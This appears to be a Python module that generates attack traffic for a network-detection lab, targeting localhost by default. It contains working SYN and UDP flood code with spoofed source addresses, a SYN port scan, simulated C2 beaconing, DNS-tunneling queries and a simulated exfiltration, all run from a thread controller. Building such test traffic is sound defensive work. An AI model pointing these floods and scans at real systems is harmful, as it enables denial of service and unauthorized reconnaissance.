"""
Real attack generators for demo/lab purposes.

Uses raw sockets to generate real network traffic that the detection
system can capture and analyze.  All attacks target localhost
(127.0.0.1) by default for safe single-PC demos.

LAB / DEMO USE ONLY — do not target systems you do not own or
have explicit written permission to test.
"""

import ipaddress
import logging
import random
import socket
import struct
import threading
import time
from typing import Optional

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

DEFAULT_TARGET = "127.0.0.1"
DEFAULT_INTERFACE = "lo"

DEMO_PORTS = [22, 80, 443, 3306, 5432, 8080, 8443, 3000, 5000, 8000]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _random_port() -> int:
    return random.randint(1024, 65535)


def _random_external_ip() -> str:
    """Generate a random external IP (for spoofed sources)."""
    while True:
        octets = [random.randint(1, 223) for _ in range(4)]
        if octets[0] == 10:
            continue
        if octets[0] == 172 and 16 <= octets[1] <= 31:
            continue
        if octets[0] == 192 and octets[1] == 168:
            continue
        if octets[0] == 127:
            continue
        return ".".join(str(o) for o in octets)


def _checksum(data: bytes) -> int:
    """Compute ICMP/TCP/UDP checksum."""
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!" + "H" * (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


# ---------------------------------------------------------------------------
# Attack: SYN Flood
# ---------------------------------------------------------------------------


def syn_flood(
    target: str = DEFAULT_TARGET,
    target_port: int = 80,
    duration: float = 10.0,
    rate: int = 500,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Send a burst of TCP SYN packets to simulate a DDoS SYN flood.

    Uses raw sockets when available; falls back to connect() storms.
    LAB/DEMO USE ONLY.
    """
    logger.info("[ATTACK] SYN flood -> %s:%d for %ss at %d/s", target, target_port, duration, rate)
    stop = stop_event or threading.Event()
    sent = 0

    try:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            start = time.time()
            while time.time() - start < duration and not stop.is_set():
                src_ip = _random_external_ip()
                src_port = _random_port()
                seq = random.randint(0, 0xFFFFFFFF)
                window = random.randint(1024, 65535)

                ip_ihl = 5
                ip_ver = 4
                ip_tos = 0
                ip_tot_len = 40
                ip_id = random.randint(0, 65535)
                ip_frag_off = 0
                ip_ttl = 64
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0

                ip_header = struct.pack(
                    "!BBHHHBBH4s4s",
                    (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len, ip_id,
                    ip_frag_off, ip_ttl, ip_proto, ip_check,
                    socket.inet_aton(src_ip), socket.inet_aton(target),
                )

                tcp_syn = 0x02
                tcp_offset = 5
                tcp_check = 0
                tcp_urg_ptr = 0

                tcp_header = struct.pack(
                    "!HHLLBBHHH",
                    src_port, target_port, seq, 0,
                    (tcp_offset << 4), tcp_syn, window,
                    tcp_check, tcp_urg_ptr,
                )

                sock.sendto(ip_header + tcp_header, (target, target_port))
                sent += 1

                if rate > 0:
                    time.sleep(1.0 / rate)

            sock.close()

        except PermissionError:
            logger.info("[ATTACK] Raw socket unavailable, using connect() storm fallback")
            start = time.time()
            while time.time() - start < duration and not stop.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((target, target_port))
                    s.close()
                    sent += 1
                except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                    sent += 1
                if rate > 0:
                    time.sleep(1.0 / rate)

    except Exception as exc:
        logger.error("[ATTACK] SYN flood error: %s", exc)

    logger.info("[ATTACK] SYN flood complete: %d packets", sent)
    return f"SYN flood: {sent} packets to {target}:{target_port}"


# ---------------------------------------------------------------------------
# Attack: UDP Flood
# ---------------------------------------------------------------------------


def udp_flood(
    target: str = DEFAULT_TARGET,
    target_port: int = 53,
    duration: float = 10.0,
    rate: int = 500,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Send a flood of UDP datagrams to simulate a UDP flood DDoS.

    LAB/DEMO USE ONLY.
    """
    logger.info("[ATTACK] UDP flood -> %s:%d for %ss at %d/s", target, target_port, duration, rate)
    stop = stop_event or threading.Event()
    sent = 0
    payload = b"\x00" * random.randint(64, 1400)

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        start = time.time()
        while time.time() - start < duration and not stop.is_set():
            try:
                sock.sendto(payload, (target, target_port))
                sent += 1
            except OSError:
                pass
            if rate > 0:
                time.sleep(1.0 / max(rate, 1))
        sock.close()

    except Exception as exc:
        logger.error("[ATTACK] UDP flood error: %s", exc)

    logger.info("[ATTACK] UDP flood complete: %d datagrams", sent)
    return f"UDP flood: {sent} datagrams to {target}:{target_port}"


# ---------------------------------------------------------------------------
# Attack: C2 Beaconing
# ---------------------------------------------------------------------------


def c2_beacon_sim(
    target: str = DEFAULT_TARGET,
    target_port: int = 4444,
    interval: float = 2.0,
    duration: float = 15.0,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Simulate C2 beaconing with periodic TCP connections at a fixed interval.

    LAB/DEMO USE ONLY.
    """
    logger.info("[ATTACK] C2 beaconing -> %s:%d every %ss for %ss", target, target_port, interval, duration)
    stop = stop_event or threading.Event()
    beacons = 0

    try:
        end_time = time.time() + duration
        while time.time() < end_time and not stop.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                s.connect((target, target_port))
                s.send(b"\x00" * 16)
                s.close()
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                pass
            beacons += 1
            time.sleep(interval)

    except Exception as exc:
        logger.error("[ATTACK] C2 beaconing error: %s", exc)

    logger.info("[ATTACK] C2 beaconing complete: %d beacons", beacons)
    return f"C2 beaconing: {beacons} beacons at {interval}s interval"


# ---------------------------------------------------------------------------
# Attack: DNS Tunneling
# ---------------------------------------------------------------------------


def dns_tunnel_sim(
    target: str = DEFAULT_TARGET,
    target_port: int = 53,
    duration: float = 8.0,
    rate: int = 50,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Send crafted DNS queries with long subdomain labels to simulate
    DNS tunneling / DGA-based exfiltration.

    LAB/DEMO USE ONLY.
    """
    logger.info("[ATTACK] DNS tunnel -> %s:%d for %ss at %d/s", target, target_port, duration, rate)
    stop = stop_event or threading.Event()
    sent = 0

    suspicious_domains = [
        "a1b2c3d4.evil.example.com",
        "xYz.malware-c2.net",
        "longsubdomain.bigger.longer.suspicious.example.org",
        "a" * 30 + ".exfil.example.com",
        "beacon." + "x" * 20 + ".c2.net",
    ]

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1.0)

        start = time.time()
        while time.time() - start < duration and not stop.is_set():
            domain = random.choice(suspicious_domains)
            transaction_id = random.randint(0, 65535)
            flags = 0x0100
            qdcount, ancount, nscount, arcount = 1, 0, 0, 0

            dns_header = struct.pack(
                "!HHHHHH",
                transaction_id, flags, qdcount, ancount, nscount, arcount,
            )

            qname = b""
            for part in domain.split("."):
                qname += bytes([len(part)]) + part.encode()
            qname += b"\x00"
            qtype_qclass = struct.pack("!HH", 1, 1)
            dns_query = dns_header + qname + qtype_qclass

            try:
                sock.sendto(dns_query, (target, target_port))
                sent += 1
            except OSError:
                pass

            time.sleep(1.0 / max(rate, 1))

        sock.close()

    except Exception as exc:
        logger.error("[ATTACK] DNS tunnel error: %s", exc)

    logger.info("[ATTACK] DNS tunnel complete: %d queries", sent)
    return f"DNS tunnel: {sent} queries to {target}:{target_port}"


# ---------------------------------------------------------------------------
# Attack: Port Scan
# ---------------------------------------------------------------------------


def port_scan(
    target: str = DEFAULT_TARGET,
    ports: Optional[list] = None,
    duration: float = 8.0,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Scan a range of ports on the target — simulates reconnaissance.

    LAB/DEMO USE ONLY.
    """
    ports = ports or DEMO_PORTS[:8]
    logger.info("[ATTACK] Port scan -> %s ports %s", target, ports)
    stop = stop_event or threading.Event()
    scanned = 0

    try:
        start = time.time()
        for port in ports:
            if stop.is_set() or (time.time() - start) > duration:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.8)
                s.connect((target, port))
                s.close()
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                pass
            scanned += 1
            time.sleep(0.3)

        for port in ports[:5]:
            if stop.is_set() or (time.time() - start) > duration:
                break
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((target, port))
                s.close()
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                pass
            scanned += 1
            time.sleep(0.1)

    except Exception as exc:
        logger.error("[ATTACK] Port scan error: %s", exc)

    logger.info("[ATTACK] Port scan complete: %d probes", scanned)
    return f"Port scan: {scanned} probes on {len(ports)} ports"


# ---------------------------------------------------------------------------
# Attack: Data Exfiltration
# ---------------------------------------------------------------------------


def data_exfil_sim(
    target: str = DEFAULT_TARGET,
    target_port: int = 443,
    duration: float = 10.0,
    size_mb: float = 1.0,
    stop_event: Optional[threading.Event] = None,
) -> str:
    """
    Simulate data exfiltration by sending large payloads to an external host.

    Uses TCP connections with large payloads.  Falls back to smaller
    chunks if the connection is refused.

    LAB/DEMO USE ONLY.
    """
    logger.info(
        "[ATTACK] Data exfil -> %s:%d for %ss, ~%sMB",
        target, target_port, duration, size_mb,
    )
    stop = stop_event or threading.Event()
    sent_bytes = 0
    chunks = 0
    chunk_size = 8192
    total_target = int(size_mb * 1024 * 1024)
    payload = b"\x00" * chunk_size

    try:
        start = time.time()
        while time.time() - start < duration and not stop.is_set() and sent_bytes < total_target:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2.0)
                s.connect((target, target_port))
                s.sendall(payload)
                s.close()
                sent_bytes += chunk_size
                chunks += 1
            except (ConnectionRefusedError, ConnectionAbortedError, TimeoutError, OSError):
                # Count attempted bytes even on failure
                sent_bytes += chunk_size
                chunks += 1
            time.sleep(0.05)

    except Exception as exc:
        logger.error("[ATTACK] Data exfil error: %s", exc)

    logger.info("[ATTACK] Data exfil complete: %d chunks, ~%d bytes", chunks, sent_bytes)
    return f"Data exfil: {chunks} chunks (~{sent_bytes / 1024 / 1024:.1f}MB) to {target}:{target_port}"


# ---------------------------------------------------------------------------
# Scapy-based variants (optional — requires scapy)
# ---------------------------------------------------------------------------


def _scapy_available() -> bool:
    try:
        import scapy.all  # noqa: F401
        return True
    except (ImportError, OSError):
        return False


if _scapy_available():
    from scapy.all import IP, TCP, UDP, send, sr1  # noqa: E402

    def syn_flood_scapy(target: str, target_port: int, duration: float, rate: int = 500) -> str:
        """Scapy-based SYN flood with proper packet crafting."""
        logger.info("[ATTACK][scapy] SYN flood -> %s:%d", target, target_port)
        sent = 0
        start = time.time()
        try:
            while time.time() - start < duration:
                pkt = IP(src=_random_external_ip(), dst=target) / TCP(
                    dport=target_port, sport=_random_port(), flags="S", seq=random.randint(0, 0xFFFFFFFF),
                )
                send(pkt, verbose=False)
                sent += 1
                time.sleep(1.0 / max(rate, 1))
        except Exception as exc:
            logger.error("[ATTACK][scapy] SYN flood error: %s", exc)
        return f"Scapy SYN flood: {sent} packets to {target}:{target_port}"

    def udp_flood_scapy(target: str, target_port: int, duration: float, rate: int = 500) -> str:
        """Scapy-based UDP flood."""
        logger.info("[ATTACK][scapy] UDP flood -> %s:%d", target, target_port)
        sent = 0
        start = time.time()
        try:
            while time.time() - start < duration:
                pkt = IP(src=_random_external_ip(), dst=target) / UDP(
                    dport=target_port, sport=_random_port(),
                ) / (b"\x00" * random.randint(64, 1400))
                send(pkt, verbose=False)
                sent += 1
                time.sleep(1.0 / max(rate, 1))
        except Exception as exc:
            logger.error("[ATTACK][scapy] UDP flood error: %s", exc)
        return f"Scapy UDP flood: {sent} packets to {target}:{target_port}"

    def port_scan_scapy(target: str, ports: list, duration: float = 8.0) -> str:
        """Scapy-based SYN port scan (stealth half-open)."""
        logger.info("[ATTACK][scapy] Port scan -> %s ports %s", target, ports)
        scanned = 0
        start = time.time()
        try:
            for port in ports:
                if time.time() - start > duration:
                    break
                pkt = IP(dst=target) / TCP(dport=port, flags="S")
                resp = sr1(pkt, timeout=0.5, verbose=False)
                scanned += 1
        except Exception as exc:
            logger.error("[ATTACK][scapy] Port scan error: %s", exc)
        return f"Scapy port scan: {scanned} ports on {target}"

    logger.info("[attack_gen] Scapy is available — scapy-based attack variants enabled")
else:
    logger.info("[attack_gen] Scapy not installed — using socket-based attacks only")


# ---------------------------------------------------------------------------
# Attack Controller
# ---------------------------------------------------------------------------


class AttackController:
    """Manages attack threads and provides status."""

    def __init__(self) -> None:
        self._threads: dict[str, threading.Thread] = {}
        self._stop_events: dict[str, threading.Event] = {}
        self._results: dict[str, str] = {}
        self._lock = threading.Lock()

    # Map internal attack_type keys to the correct function
    _ATTACK_MAP = {
        "syn_flood": syn_flood,
        "udp_flood": udp_flood,
        "port_scan": port_scan,
        "c2_beaconing": c2_beacon_sim,
        "dga_domain": dns_tunnel_sim,
        "dns_tunnel": dns_tunnel_sim,
        "data_exfiltration": data_exfil_sim,
    }

    def launch(self, attack_type: str, **kwargs) -> str:
        """Launch an attack in a background thread. Returns attack ID."""
        func = self._ATTACK_MAP.get(attack_type)
        if not func:
            raise ValueError(
                f"Unknown attack type: {attack_type}. "
                f"Choose from: {sorted(self._ATTACK_MAP.keys())}"
            )

        attack_id = f"{attack_type}_{int(time.time() * 1000)}"
        stop_event = threading.Event()

        # Inject stop_event if caller didn't provide one
        kwargs.setdefault("stop_event", stop_event)

        def _run() -> None:
            try:
                result = func(**kwargs)
                self._results[attack_id] = result
            except Exception as exc:
                self._results[attack_id] = f"ERROR: {exc}"

        thread = threading.Thread(target=_run, daemon=True, name=f"attack-{attack_type}")
        thread.start()

        with self._lock:
            self._threads[attack_id] = thread
            self._stop_events[attack_id] = stop_event

        logger.info("[CTRL] Launched %s (id=%s)", attack_type, attack_id)
        return attack_id

    def stop(self, attack_id: str) -> bool:
        """Stop a running attack by ID."""
        with self._lock:
            event = self._stop_events.get(attack_id)
            if event:
                event.set()
                logger.info("[CTRL] Stopping attack %s", attack_id)
                return True
        return False

    def stop_all(self) -> None:
        """Stop all running attacks."""
        with self._lock:
            for event in self._stop_events.values():
                event.set()
        logger.info("[CTRL] All attacks stopped")

    def is_running(self, attack_id: str) -> bool:
        with self._lock:
            thread = self._threads.get(attack_id)
            return thread is not None and thread.is_alive()

    def get_result(self, attack_id: str) -> str:
        return self._results.get(attack_id, "pending...")

    def active_attacks(self) -> list[dict]:
        """List all active attacks."""
        result = []
        with self._lock:
            for aid, thread in self._threads.items():
                if thread.is_alive():
                    result.append({
                        "id": aid,
                        "type": aid.rsplit("_", 1)[0],
                        "result": self._results.get(aid, "running..."),
                    })
        return result


# Singleton
controller = AttackController()
